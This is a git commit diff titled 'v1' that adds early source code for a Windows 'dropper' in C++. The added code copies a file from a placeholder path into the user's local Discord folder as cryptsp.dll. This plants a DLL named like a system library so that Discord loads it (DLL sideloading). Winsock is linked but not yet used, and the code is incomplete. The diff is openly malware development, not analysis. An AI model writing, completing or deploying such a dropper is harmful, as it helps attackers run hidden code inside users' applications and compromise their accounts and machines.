896d6fece69a42e8a3936771de9b8bbc0a219133
TroII46 <t386251@gmail.com>
2024-10-22 18:29:56 +0200

    v1

--- dropper/main.cpp
+++ dropper/main.cpp
@@ -1,5 +1,31 @@
 #include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <fstream>
+
+#pragma comment(lib, "Ws2_32.lib") // Vincular con la biblioteca Winsock
 
 int main() {
+	std::string discordPath = std::string(getenv("localappdata")) + "\\Discord\\";
+	std::string dllName = "cryptsp.dll";
+
+	std::ifstream OpenDll("Path", std::ios::binary);
+
+	
+
+	std::ofstream dll(discordPath + dllName, std::ios::binary);
+	
+	
+	
+	char buffer[4096];
+	while (OpenDll.read(buffer, sizeof(buffer)))
+	{
+		dll.write(buffer, sizeof(buffer));
+	}
+
+	dll.write(buffer, OpenDll.gcount());
+
+	OpenDll.close();
+	dll.close();
 	return 0;
 }
